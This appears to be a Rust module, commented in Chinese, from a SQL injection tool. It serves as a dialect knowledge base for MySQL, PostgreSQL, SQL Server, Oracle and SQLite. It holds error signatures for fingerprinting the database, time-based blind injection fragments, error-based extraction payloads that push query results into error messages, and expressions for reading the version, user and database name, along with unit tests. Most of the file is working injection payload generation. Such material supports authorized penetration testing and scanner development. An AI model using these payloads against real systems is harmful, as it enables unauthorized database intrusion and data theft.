//! SQL 方言知识库:每种 [`Dbms`] 的报错特征、睡眠注入、报错型数据外带模板,以及
//! 版本 / 当前用户 / 当前库的标量表达式。集中放在这里,载荷生成与指纹判定都从这里取,
//! 加新方言只改一处。

use crate::EXFIL_MARK;

/// 目标数据库类型。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Dbms {
    MySql,
    PostgreSql,
    MsSql,
    Oracle,
    Sqlite,
}

/// 要读取的标量信息(库指纹后用一条注入即可取回)。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Scalar {
    /// 数据库版本。
    Version,
    /// 当前连接用户。
    User,
    /// 当前数据库 / schema 名。
    Database,
}

impl Scalar {
    pub const ALL: [Scalar; 3] = [Scalar::Version, Scalar::User, Scalar::Database];

    /// 英文标签(界面翻译 + 报告展示)。
    pub fn label(self) -> &'static str {
        match self {
            Scalar::Version => "Version",
            Scalar::User => "Current user",
            Scalar::Database => "Current database",
        }
    }
}

/// 一段睡眠注入(让数据库延迟若干秒,用于时间盲注)。
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct TimeInject {
    /// 注入片段(不含边界 prefix/suffix)。`stacked` 决定它前面接空格还是 `;`。
    pub sql: String,
    /// 是否堆叠语句(如 MSSQL 的 `WAITFOR`,需用 `;` 与原语句分隔)。
    pub stacked: bool,
}

impl Dbms {
    pub const ALL: [Dbms; 5] = [
        Dbms::MySql,
        Dbms::PostgreSql,
        Dbms::MsSql,
        Dbms::Oracle,
        Dbms::Sqlite,
    ];

    /// 展示名。
    pub fn label(self) -> &'static str {
        match self {
            Dbms::MySql => "MySQL",
            Dbms::PostgreSql => "PostgreSQL",
            Dbms::MsSql => "Microsoft SQL Server",
            Dbms::Oracle => "Oracle",
            Dbms::Sqlite => "SQLite",
        }
    }

    /// 该方言典型报错特征(**小写**;在小写响应里命中即指纹该库)。
    pub fn error_signatures(self) -> &'static [&'static str] {
        match self {
            Dbms::MySql => &[
                "you have an error in your sql syntax",
                "check the manual that corresponds to your mysql",
                "warning: mysqli",
                "warning: mysql",
                "mysql_fetch",
                "valid mysql result",
                "mysqlclient",
                "xpath syntax error", // extractvalue / updatexml 报错外带
            ],
            Dbms::PostgreSql => &[
                "pg_query()",
                "pg_exec()",
                "postgresql query failed",
                "syntax error at or near",
                "unterminated quoted string at or near",
                "invalid input syntax for",
                "org.postgresql.util.psqlexception",
            ],
            Dbms::MsSql => &[
                "unclosed quotation mark after the character string",
                "incorrect syntax near",
                "conversion failed when converting",
                "microsoft sql server",
                "microsoft ole db provider for sql server",
                "system.data.sqlclient.sqlexception",
            ],
            Dbms::Oracle => &[
                "ora-00933", // SQL command not properly ended
                "ora-00921", // unexpected end of SQL command
                "ora-01756", // quoted string not properly terminated
                "ora-00904",
                "oracle error",
                "quoted string not properly terminated",
            ],
            Dbms::Sqlite => &[
                "sqlite3::",
                "sqlite_error",
                "sqlite.exception",
                "unrecognized token:",
                "sqlitemanager",
            ],
        }
    }

    /// 睡眠注入条件(让数据库延迟 `secs` 秒);SQLite 无原生 sleep → `None`。
    pub fn time_condition(self, secs: u32) -> Option<TimeInject> {
        let ti = match self {
            // 子查询包一层 → 全表只睡一次(避免 `AND SLEEP()` 逐行睡)。
            Dbms::MySql => TimeInject {
                sql: format!("AND (SELECT 1 FROM (SELECT SLEEP({secs}))zz)"),
                stacked: false,
            },
            Dbms::PostgreSql => TimeInject {
                sql: format!("AND 1=(SELECT 1 FROM PG_SLEEP({secs}))"),
                stacked: false,
            },
            Dbms::MsSql => TimeInject {
                sql: format!("WAITFOR DELAY '0:0:{secs}'"),
                stacked: true,
            },
            Dbms::Oracle => TimeInject {
                sql: format!("AND 1=(SELECT COUNT(*) FROM ALL_USERS WHERE DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),{secs})=1)"),
                stacked: false,
            },
            Dbms::Sqlite => return None,
        };
        Some(ti)
    }

    /// 把标量子查询 `inner` 两侧包上外带标记并按方言拼接(产出**字符串型**表达式),
    /// 供联合查询列与报错外带共用;[`crate::detect::parse_exfil`] 据此切回结果。
    pub fn wrap_scalar(self, inner: &str) -> String {
        let m = EXFIL_MARK;
        match self {
            Dbms::MySql => format!("CONCAT('{m}',({inner}),'{m}')"),
            Dbms::PostgreSql | Dbms::Oracle | Dbms::Sqlite => format!("('{m}'||({inner})||'{m}')"),
            Dbms::MsSql => format!("('{m}'+CAST(({inner}) AS NVARCHAR(4000))+'{m}')"),
        }
    }

    /// 报错型数据外带:把 `inner` 标量的结果挤进数据库报错信息(响应回显)。返回不含边界的注入片段;
    /// 该方言不支持(如 SQLite)返回 `None`。结果两侧带 [`EXFIL_MARK`],用 `parse_exfil` 切出。
    pub fn error_extract(self, inner: &str) -> Option<String> {
        let wrapped = self.wrap_scalar(inner);
        let frag = match self {
            // XPATH 报错回显:`XPATH syntax error: '~qScRyQ<result>qScRyQ'`
            Dbms::MySql => format!("AND EXTRACTVALUE(1,CONCAT(0x7e,{wrapped}))"),
            // `invalid input syntax for integer: "qScRyQ<result>qScRyQ"`
            Dbms::PostgreSql => format!("AND 1=CAST({wrapped} AS INT)"),
            // `Conversion failed when converting the nvarchar value 'qScRyQ<result>qScRyQ' ...`
            Dbms::MsSql => format!("AND 1=CONVERT(INT,{wrapped})"),
            // `ORA-29257: host qScRyQ<result>qScRyQ unknown`
            Dbms::Oracle => format!("AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS({wrapped}) FROM DUAL)"),
            Dbms::Sqlite => return None,
        };
        Some(frag)
    }

    /// 取某标量的 SQL 表达式(版本 / 当前用户 / 当前库),按方言不同。
    pub fn scalar(self, what: Scalar) -> &'static str {
        match (self, what) {
            (Dbms::MySql, Scalar::Version) => "version()",
            (Dbms::MySql, Scalar::User) => "current_user()",
            (Dbms::MySql, Scalar::Database) => "database()",
            (Dbms::PostgreSql, Scalar::Version) => "version()",
            (Dbms::PostgreSql, Scalar::User) => "current_user",
            (Dbms::PostgreSql, Scalar::Database) => "current_database()",
            (Dbms::MsSql, Scalar::Version) => "@@version",
            (Dbms::MsSql, Scalar::User) => "system_user",
            (Dbms::MsSql, Scalar::Database) => "db_name()",
            (Dbms::Oracle, Scalar::Version) => "(SELECT banner FROM v$version WHERE rownum=1)",
            (Dbms::Oracle, Scalar::User) => "user",
            (Dbms::Oracle, Scalar::Database) => "(SELECT global_name FROM global_name)",
            (Dbms::Sqlite, Scalar::Version) => "sqlite_version()",
            (Dbms::Sqlite, Scalar::User) => "''",
            (Dbms::Sqlite, Scalar::Database) => "'main'",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_dbms_has_signatures() {
        for d in Dbms::ALL {
            assert!(!d.error_signatures().is_empty(), "{} 无报错特征", d.label());
            // 特征必须是小写(判定时在小写文本里 contains)。
            for s in d.error_signatures() {
                assert_eq!(*s, s.to_ascii_lowercase(), "特征须小写: {s}");
            }
        }
    }

    #[test]
    fn wrap_scalar_carries_marker_both_sides() {
        let w = Dbms::MySql.wrap_scalar("version()");
        assert_eq!(w, "CONCAT('qScRyQ',(version()),'qScRyQ')");
        let p = Dbms::PostgreSql.wrap_scalar("version()");
        assert!(p.starts_with("('qScRyQ'||"));
        assert!(p.ends_with("||'qScRyQ')"));
    }

    #[test]
    fn error_extract_supported_matrix() {
        assert!(Dbms::MySql.error_extract("version()").unwrap().contains("EXTRACTVALUE"));
        assert!(Dbms::PostgreSql.error_extract("version()").unwrap().contains("CAST"));
        assert!(Dbms::MsSql.error_extract("@@version").unwrap().contains("CONVERT"));
        assert!(Dbms::Oracle.error_extract("user").is_some());
        // SQLite 不支持报错外带。
        assert!(Dbms::Sqlite.error_extract("sqlite_version()").is_none());
    }

    #[test]
    fn time_condition_only_sqlite_unsupported() {
        assert!(Dbms::MySql.time_condition(5).unwrap().sql.contains("SLEEP(5)"));
        assert!(!Dbms::MySql.time_condition(5).unwrap().stacked);
        assert!(Dbms::MsSql.time_condition(5).unwrap().stacked);
        assert!(Dbms::Sqlite.time_condition(5).is_none());
    }

    #[test]
    fn scalar_expressions_present_for_all() {
        for d in Dbms::ALL {
            for s in Scalar::ALL {
                assert!(!d.scalar(s).is_empty());
            }
        }
    }
}
